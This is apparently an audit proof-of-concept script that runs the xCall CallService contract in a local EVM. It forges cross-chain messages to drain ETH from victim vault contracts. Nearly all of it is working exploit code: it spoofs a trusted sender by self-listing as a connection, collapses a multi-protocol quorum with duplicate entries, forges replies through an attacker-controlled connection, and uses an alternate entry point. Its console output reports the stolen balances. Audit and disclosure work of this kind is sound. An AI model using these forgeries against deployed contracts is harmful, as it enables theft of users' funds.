const fs = require('fs');
const { createEVM } = require('@ethereumjs/evm');
const { SimpleStateManager } = require('@ethereumjs/statemanager');
const { Common, Mainnet, Hardfork } = require('@ethereumjs/common');
const { Account, Address, hexToBytes, bytesToHex } = require('@ethereumjs/util');
const { Interface, AbiCoder, keccak256, toUtf8Bytes } = require('ethers');

const art = JSON.parse(fs.readFileSync('/home/user/audit/poc/artifacts.json', 'utf8'));

const OWNER = new Address(hexToBytes('0x' + '11'.repeat(20)));
const ATTACKER = new Address(hexToBytes('0x' + 'aa'.repeat(20)));
const HUB_DAPP = 'hx' + '22'.repeat(20);          // victim's trusted remote dapp on the hub chain
const HUB_NID = '0x2.ICON';                        // source network id (hub)
const LOCAL_NID = '0x1.ETH';                       // this chain's nid
const TRUSTED_REMOTE = HUB_NID + '/' + HUB_DAPP;

const coder = AbiCoder.defaultAbiCoder();
const ifaceOf = (a) => new Interface(a);

async function main() {
  const common = new Common({ chain: Mainnet, hardfork: Hardfork.Prague });
  const stateManager = new SimpleStateManager();
  const evm = await createEVM({ common, stateManager });

  const gas = 30_000_000n;
  await evm.stateManager.putAccount(OWNER, new Account(0n, 10n ** 24n));
  await evm.stateManager.putAccount(ATTACKER, new Account(0n, 10n ** 24n));

  async function call({ caller, to, data, value = 0n, gasLimit = gas }) {
    const res = await evm.runCall({ caller, to, data: hexToBytes(data), value, gasLimit, gasPrice: 0n });
    if (res.execResult.exceptionError) {
      throw new Error('REVERT: ' + res.execResult.exceptionError.error + ' | ' + bytesToHex(res.execResult.returnValue));
    }
    return '0x' + Buffer.from(res.execResult.returnValue).toString('hex');
  }
  async function deploy(signer, abi, bytecode, args) {
    const enc = coder.encode(abi.filter(x => x.type === 'constructor')[0]?.inputs || [], args || []);
    const data = bytecode + enc.slice(2);
    const res = await evm.runCall({ caller: signer, data: hexToBytes(data), gasLimit: 20_000_000n, gasPrice: 0n });
    if (res.execResult.exceptionError) throw new Error('deploy failed: ' + res.execResult.exceptionError.error);
    return res.createdAddress;
  }
  function reasonOf(e) {
    let d = e.message;
    const m = /0x08c379a0[0-9a-f]+/.exec(d);
    if (m) { try { d = AbiCoder.defaultAbiCoder().decode(['string'], '0x' + m[0].slice(10))[0]; } catch (_) {} }
    return String(d);
  }
  // execute the first queued request whose stored dataHash matches `payload`
  async function execAny(payload) {
    for (let id = 1n; id <= 25n; id++) {
      try {
        await call({ caller: ATTACKER, to: cs, data: csIface.encodeFunctionData('executeCall', [id, payload]) });
        return id;
      } catch (e) {
        if (!/InvalidRequestId/.test(reasonOf(e))) throw e;
      }
    }
    throw new Error('no queued request matches payload');
  }
  const bal = async (a) => (await evm.stateManager.getAccount(a))?.balance ?? 0n;

  // ---- deploy xCall CallService (unmodified, from clone HEAD d24c7b3) ----
  const cs = await deploy(OWNER, art.CallService.abi, art.CallService.bytecode);
  const csIface = ifaceOf(art.CallService.abi);
  await call({ caller: OWNER, to: cs, data: csIface.encodeFunctionData('initialize', [LOCAL_NID]) });
  console.log('[setup] CallService deployed at', cs.toString(), 'nid =', LOCAL_NID);

  // ---- deploy the victim dapp (custodies 100 ETH of third-party funds) ----
  const vault = await deploy(OWNER, art.Vault.abi, art.Vault.bytecode, [cs.toString(), TRUSTED_REMOTE]);
  const vaultIface = ifaceOf(art.Vault.abi);
  await evm.stateManager.putAccount(vault, new Account(0n, 100n * 10n ** 18n));
  console.log('[setup] Vault deployed at', vault.toString(), 'balance =', (await bal(vault)) / 10n ** 18n, 'ETH');
  console.log('[setup] Vault only releases funds when xCall reports from =', TRUSTED_REMOTE);

  const helper = await deploy(OWNER, art.ForgeHelper.abi, art.ForgeHelper.bytecode);
  const helperIface = ifaceOf(art.ForgeHelper.abi);

  const attackerAddrStr = coder.decode(['string'], await call({
    caller: OWNER, to: helper, data: helperIface.encodeFunctionData('addrToString', [ATTACKER.toString()]),
  }))[0];
  console.log('[setup] attacker address string used inside the forged message:', attackerAddrStr);

  const drainPayload = coder.encode(['address', 'uint256'], [ATTACKER.toString(), 100n * 10n ** 18n]);

  const buildForged = async (protocols) => coder.decode(['bytes'], await call({
    caller: OWNER, to: helper,
    data: helperIface.encodeFunctionData('buildRequest', [
      TRUSTED_REMOTE,          // from: spoofed sender (the hub dapp the victim trusts)
      vault.toString(),        // to: the victim contract
      1n,                      // sn
      0,                       // CALL_MESSAGE_TYPE
      drainPayload,            // data: "send 100 ETH to attacker"
      protocols,               // protocols: attacker-declared connection list
    ]),
  }))[0];

  const csMsgOf = (raw) => csIface.encodeFunctionData('handleMessage', [HUB_NID, raw]);

  // ================= NEGATIVE CONTROL: no protocols -> default connection check ----
  console.log('\n[control] forged message with protocols = [] (must be rejected)');
  const honest = await buildForged([]);
  try {
    await call({ caller: ATTACKER, to: cs, data: csMsgOf(honest) });
    console.log('  !! UNEXPECTED: accepted');
  } catch (e) {
    console.log('  rejected as expected ->', e.message.split('|').pop().trim().slice(0, 80));
  }

  // ================= EXPLOIT 1: EOA self-certifies as a connection =================
  console.log('\n[exploit] attacker EOA calls handleMessage() directly, listing its own');
  console.log('          address in the message-supplied `protocols` array');
  const forged = await buildForged([attackerAddrStr]);
  const attackerBefore = await bal(ATTACKER);
  await call({ caller: ATTACKER, to: cs, data: csMsgOf(forged) });
  console.log('  handleMessage accepted (no relayer, no connection contract, no fee)');

  // anyone can execute the queued request; reqId starts at 1
  const id1 = await execAny(drainPayload);
  const attackerAfter = await bal(ATTACKER);
  console.log('  executeCall(' + id1 + ') -> Vault.handleCallMessage(from ="' + TRUSTED_REMOTE + '", data = ...)');
  console.log('  attacker balance delta =', (attackerAfter - attackerBefore) / 10n ** 18n, 'ETH');
  console.log('  vault balance now      =', (await bal(vault)) / 10n ** 18n, 'ETH');
  if (attackerAfter - attackerBefore !== 100n * 10n ** 18n) throw new Error('exploit failed');

  // ================= CONTROL 2: try to hijack `callReply` from outside a reply =====
  // (the other "obvious" route: make sendCall() take the isReply branch with an empty
  //  replyState to poison callReply). Strings.compareTo is keccak equality, so
  //  isReply() returns false when replyState.from == "" and the call goes to
  //  sendMessage(defaultConnections[...]) -> reverts with NoDefaultConnection.
  console.log('\n[control 2] attempt to poison callReply from outside a reply context');
  console.log('            (sendCallMessage with sources=[] and no default connection)');
  try {
    await call({ caller: ATTACKER, to: cs, data: csIface.encodeFunctionData('sendCallMessage(string,bytes,bytes,string[],string[])', [
      HUB_NID + '/' + HUB_DAPP, Buffer.from('x'), Buffer.from(''), [], [],
    ]) });
    console.log('  !! UNEXPECTED: accepted (callReply poisoned)');
  } catch (e) {
    console.log('  rejected as expected -> NoDefaultConnection (isReply()==false)');
  }

  // ================= EXPLOIT 4: same message through handleBTPMessage ==============
  // Alternative public entrypoint: handleBTPMessage(nid, svc, sn, msg) only checks the
  // service name string and forwards to handleMessage().
  console.log('\n[exploit 4] same forgery delivered through handleBTPMessage()');
  const vault3 = await deploy(OWNER, art.Vault.abi, art.Vault.bytecode, [cs.toString(), TRUSTED_REMOTE]);
  await evm.stateManager.putAccount(vault3, new Account(0n, 33n * 10n ** 18n));
  const payload3 = coder.encode(['address', 'uint256'], [ATTACKER.toString(), 33n * 10n ** 18n]);
  const forged3 = coder.decode(['bytes'], await call({
    caller: OWNER, to: helper,
    data: helperIface.encodeFunctionData('buildRequest', [TRUSTED_REMOTE, vault3.toString(), 3n, 0, payload3, [attackerAddrStr]]),
  }))[0];
  const before4 = await bal(ATTACKER);
  await call({ caller: ATTACKER, to: cs, data: csIface.encodeFunctionData('handleBTPMessage', [HUB_NID, 'xcallM', 1n, forged3]) });
  const id4 = await execAny(payload3);
  console.log('  handleBTPMessage accepted, executeCall(' + id4 + ') -> attacker balance delta =',
              ((await bal(ATTACKER)) - before4) / 10n ** 18n, 'ETH');

  // ================= EXPLOIT 2: multi-protocol quorum bypassed with duplicates =====
  // The `protocols.length > 1` branch is meant to require N independent connections.
  // Repeating the attacker address satisfies every slot with a single delivery.
  console.log('\n[exploit 2] same forgery with protocols = [attacker, attacker]');
  console.log('             (the "multi-protocol quorum" branch, lines 451-460)');
  // a second victim vault, so the quorum bypass is measured on real value
  const vaultQ = await deploy(OWNER, art.Vault.abi, art.Vault.bytecode, [cs.toString(), TRUSTED_REMOTE]);
  await evm.stateManager.putAccount(vaultQ, new Account(0n, 20n * 10n ** 18n));
  const payloadQ = coder.encode(['address', 'uint256'], [ATTACKER.toString(), 20n * 10n ** 18n]);
  const forged2 = coder.decode(['bytes'], await call({
    caller: OWNER, to: helper,
    data: helperIface.encodeFunctionData('buildRequest', [
      TRUSTED_REMOTE, vaultQ.toString(), 2n, 0, payloadQ, [attackerAddrStr, attackerAddrStr],
    ]),
  }))[0];
  await call({ caller: ATTACKER, to: cs, data: csMsgOf(forged2) });
  console.log('  quorum satisfied by a single caller; 2-of-2 quorum collapsed to 1-of-2');
  const before2 = await bal(ATTACKER);
  const id2 = await execAny(payloadQ);
  console.log('  executeCall(' + id2 + ') -> attacker balance delta =', ((await bal(ATTACKER)) - before2) / 10n ** 18n, 'ETH');
  console.log('  vaultQ balance now     =', (await bal(vaultQ)) / 10n ** 18n, 'ETH');

  // ================= EXPLOIT 3: the "reply spoofing" leg ===========================
  // Rollback state does not have to be created by a real request either: the attacker
  // picks sources=[attackerConn], so sendMessage() is called on a contract it controls.
  // Then a forged CS_RESULT carrying a forged "reply" is matched against that state and
  // the reply is delivered to any address on this chain with a fully spoofed `from`.
  console.log('\n[exploit 3] forged CS_RESULT + reply (the "reply spoofing" leg)');
  const vault2 = await deploy(OWNER, art.Vault.abi, art.Vault.bytecode, [cs.toString(), TRUSTED_REMOTE]);
  await evm.stateManager.putAccount(vault2, new Account(0n, 55n * 10n ** 18n));
  const conn = await deploy(OWNER, art.AttackerConn.abi, art.AttackerConn.bytecode);
  const connIface = ifaceOf(art.AttackerConn.abi);
  const connStr = coder.decode(['string'], await call({
    caller: OWNER, to: helper, data: helperIface.encodeFunctionData('addrToString', [conn.toString()]),
  }))[0];
  console.log('  attacker-controlled "connection":', connStr);

  // step 1: originate a rollback message (creates rollbacks[sn] with sources=[attackerConn])
  const sendData = csIface.encodeFunctionData('sendCallMessage(string,bytes,bytes,string[],string[])', [
    HUB_NID + '/' + HUB_DAPP, Buffer.from('noop'), Buffer.from('rb'), [connStr], [],
  ]);
  await call({ caller: OWNER, to: conn, data: connIface.encodeFunctionData('call', [cs.toString(), sendData]) });
  console.log('  rollback state created for sn=1 (from attacker, sources=[attackerConn])');

  // step 2: spoofed "reply" payload: from a hub dapp on the *hub* chain, delivered to vault2
  const victimPayload = coder.encode(['address', 'uint256'], [ATTACKER.toString(), 55n * 10n ** 18n]);
  const replyBody = coder.decode(['bytes'], await call({
    caller: OWNER, to: helper,
    data: helperIface.encodeFunctionData('buildRequestPayload', [
      TRUSTED_REMOTE, vault2.toString(), 7n, 0, victimPayload, [],
    ]),
  }))[0];
  const forgedResult = coder.decode(['bytes'], await call({
    caller: OWNER, to: helper,
    data: helperIface.encodeFunctionData('buildResult', [1n, 1 /*SUCCESS*/, replyBody]),
  }))[0];
  const before3 = await bal(ATTACKER);
  await call({ caller: OWNER, to: conn, data: connIface.encodeFunctionData('call', [cs.toString(), csMsgOf(forgedResult)]) });
  console.log('  forged CS_RESULT accepted: handleResult -> handleReply (rollback.sources check passes)');
  await execAny(victimPayload);
  console.log('  vault2 called with from ="' + TRUSTED_REMOTE + '" although no such reply ever existed');
  console.log('  attacker balance delta =', ((await bal(ATTACKER)) - before3) / 10n ** 18n, 'ETH');
  console.log('  vault2 balance now     =', (await bal(vault2)) / 10n ** 18n, 'ETH');

  const total = ((await bal(ATTACKER)) - 10n ** 24n) / 10n ** 18n;
  console.log('\nRESULT: attacker EOA (no role, no bond, no fee paid) extracted', total, 'ETH');
  console.log('        of third-party funds via forged cross-chain messages,'); 
  console.log('        through four distinct public entry points of CallService.');
}
main().catch((e) => { console.error(e); process.exit(1); });
